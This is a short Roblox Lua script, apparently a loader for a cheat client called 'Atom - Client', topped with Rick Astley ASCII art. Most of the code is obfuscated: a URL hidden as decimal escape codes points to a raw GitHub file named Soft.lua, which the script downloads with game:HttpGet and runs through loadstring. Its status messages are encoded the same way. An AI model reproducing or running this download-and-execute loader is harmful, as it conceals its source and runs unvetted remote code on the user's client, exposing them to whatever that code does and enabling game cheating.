--[[
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀[Never gonna give you up, never gonna let you down]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⠿⠟⠛⠻⣿⠆⠀⠀⠀ [Never gonna run around and desert you]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣆⣀⣀⠀⣿⠂⠀⠀⠀⠀[Never gonna make you cry, never gonna say goodbye]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠻⣿⣿⣿⠅⠛⠋⠈⠀⠀⠀⠀⠀[Never gonna tell a lie and hurt you]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢼⣿⣿⣿⣃⠠⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣟⡿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣛⣛⣫⡄⠀⢸⣦⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⡆⠸⣿⣿⣿⡷⠂⠨⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⡇⢀⣿⡿⠋⠁⢀⡶⠪⣉⢸⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡏⢸⣿⣷⣿⣿⣷⣦⡙⣿⣿⣿⣿⣿⡏⠀⠀
⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣇⢸⣿⣿⣿⣿⣿⣷⣦⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀
⠀⠀⠀⢹⣿⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
]]

local x = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\46\99\111\109\47\100\106\97\115\100\100\106\97\106\119\56\56\49\51\50\51\104\105\100\105\103\100\102\115\100\102\112\47\50\102\52\53\55\104\107\100\51\50\51\97\116\111\109\47\97\116\111\109\47\83\111\102\116\46\108\117\97"

local function f1(str)
    local res = {}
    for s in str:gmatch("\\(%d+)") do
        table.insert(res, string.char(tonumber(s)))
    end
    return table.concat(res)
end

local function f2(url)
    local httpGetResult = game:HttpGet(url)
    if httpGetResult then
        (function()
            local t = {"\76", "\97", "\117", "\110", "\99", "\104", "\105", "\110", "\103", "\32", "\65", "\116", "\111", "\109", "\32", "\45", "\32", "\67", "\108", "\105", "\101", "\110", "\116"}
            local msg = table.concat(t)
            warn(msg)
        end)()
        loadstring(httpGetResult)()
    else
        (function()
            local t = {"\67", "\97", "\110", "\39", "\116", "\32", "\108", "\111", "\97", "\100", "\32", "\65", "\116", "\111", "\109", "\32", "\45", "\32", "\67", "\108", "\105", "\101", "\110", "\116"}
            local msg = table.concat(t)
            warn(msg)
        end)()
    end
end

local f3 = (function() return f1(x) end)
local f4 = (function() return f2(f3()) end)
local f5 = (function() if f3() then f4() else
    (function()
        local t = {"\67", "\97", "\110", "\39", "\116", "\32", "\108", "\111", "\97", "\100", "\32", "\65", "\116", "\111", "\109", "\32", "\45", "\32", "\67", "\108", "\105", "\101", "\110", "\116", "\46"}
        local msg = table.concat(t)
        warn(msg)
    end)()
end end)
f5()
